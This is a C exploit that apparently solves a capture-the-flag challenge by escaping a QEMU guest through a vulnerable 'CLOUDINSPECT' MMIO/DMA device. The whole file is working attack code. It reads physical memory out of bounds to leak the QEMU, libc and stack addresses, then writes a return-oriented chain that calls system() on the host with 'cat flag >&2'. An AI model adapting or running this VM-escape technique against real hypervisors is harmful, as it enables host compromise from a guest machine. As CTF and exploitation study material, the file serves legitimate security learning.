#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdbool.h>

#define PAGEMAP_LENGTH sizeof(size_t)
unsigned int mmio_addr = 0xfeb00000;
unsigned int mmio_size = 0x100000;
char* mmio = 0;

#define CLOUDINSPECT_MMIO_OFFSET_CMD 0x78
#define CLOUDINSPECT_MMIO_OFFSET_SRC 0x80
#define CLOUDINSPECT_MMIO_OFFSET_DST 0x88
#define CLOUDINSPECT_MMIO_OFFSET_CNT 0x90
#define CLOUDINSPECT_MMIO_OFFSET_TRIGGER 0x98

typedef uint64_t u64;

void* devmap(size_t offset)
{
    int fd = open("/dev/mem", O_RDWR | O_SYNC);

    void* result = mmap(NULL, mmio_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, mmio_addr);

    close(fd);

    return result;
}

size_t virt_to_phys(void* addr)
{
    int fd = open("/proc/self/pagemap", O_RDONLY);

    size_t offset = (size_t)addr / getpagesize() * PAGEMAP_LENGTH;
    lseek(fd, offset, SEEK_SET);

    size_t page_frame_number = 0;
    read(fd, &page_frame_number, PAGEMAP_LENGTH);

    page_frame_number &= 0x7FFFFFFFFFFFFF;
 
    close(fd);

    return (page_frame_number << 12) | ((size_t)addr & 0xfff);
}

void set_cmd(u64 val)
{
    *(u64*)&mmio[CLOUDINSPECT_MMIO_OFFSET_CMD] = val;
}

void set_src(u64 val)
{
    *(u64*)&mmio[CLOUDINSPECT_MMIO_OFFSET_SRC] = val;
}

void set_dst(u64 val)
{
    *(u64*)&mmio[CLOUDINSPECT_MMIO_OFFSET_DST] = val;
}

void set_cnt(u64 val)
{
    *(u64*)&mmio[CLOUDINSPECT_MMIO_OFFSET_CNT] = val;
}

void trigger_write(void)
{
    *(u64*)&mmio[CLOUDINSPECT_MMIO_OFFSET_TRIGGER] = 1;
}

u64 trigger_read()
{
    return *(u64*)&mmio[CLOUDINSPECT_MMIO_OFFSET_TRIGGER];
}

void do_write(u64 src, u64 dst, u64 size) 
{
    set_cmd(1);
    set_src(src);
    set_dst(dst);
    set_cnt(size);
    trigger_write();
}

void do_read(u64 src, u64 dst, u64 size) 
{
    set_cmd(1);
    set_src(src);
    set_dst(dst);
    set_cnt(size);
    trigger_read();
}

int main(void)
{
    mmio = devmap(mmio_addr);
    if (!mmio) {
        return 0;
    }

    // Allocate a buffer to use for physical memory access as tmp space
    size_t* tmp_buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);

    // Force access to it so the CPU allocs physical memory for it
    memset(tmp_buf, 0xcc, 0x1000);
    printf("virtual address: %p\n", (void*)tmp_buf);

    // Get the physical address from /proc/self/pagemap
    size_t physical_mem = virt_to_phys(tmp_buf);
    printf("physical address: %p\n", (void*)physical_mem);

    // Test if write is working (for debug)
    tmp_buf[0] = 0xdeadbeefcafebabe;
    do_write(physical_mem, 0, 0x8);

    u64 offset;

    // Leak qemu base
    offset = 0x1030;
    do_read(offset, physical_mem, 0x8);
    u64 qemu_base = tmp_buf[0] - 0x37f510;
    printf("qemu base: 0x%lx\n", qemu_base);

    // Leak dma_buf
    offset = 0x1310;
    do_read(offset, physical_mem, 0x8);
    u64 dma_buf = tmp_buf[0] - 0x1388;
    printf("dma_buf: 0x%lx\n", dma_buf);

    // Leak libc
    offset = 0x2270;
    do_read(offset, physical_mem, 0x8);
    u64 libc_base = tmp_buf[0] - 0x1ebbe0;
    printf("libc base: 0x%lx\n", libc_base);

    u64 gadget = libc_base + 0xe6c7e;
    u64 libc_system = libc_base + 0x55410;
    u64 pop_rdi = libc_base + 0x26b72;
    u64 ret = libc_base + 0x25679;

    // Leak stack
    offset = libc_base + 0x1ef2e0 - dma_buf;
    do_read(offset, physical_mem, 0x8);
    u64 stack = tmp_buf[0] - 0x1c0;
    printf("stack: 0x%lx\n", stack);

    // Overwrite start of dma_buf to "cat flag >&2"
    tmp_buf[0] = 0x67616c6620746163;
    tmp_buf[1] = 0x32263e;
    do_write(physical_mem, 0, 0x10);
    printf("Write 1 complete!\n");

    // ret to system(dma_buf)
    tmp_buf[0] = pop_rdi;
    tmp_buf[1] = dma_buf;
    tmp_buf[2] = ret;
    tmp_buf[3] = libc_system;

    offset = stack - dma_buf;
    do_write(physical_mem, offset, 0x20);
    printf("Write 2 complete!\n");

    return 0;

}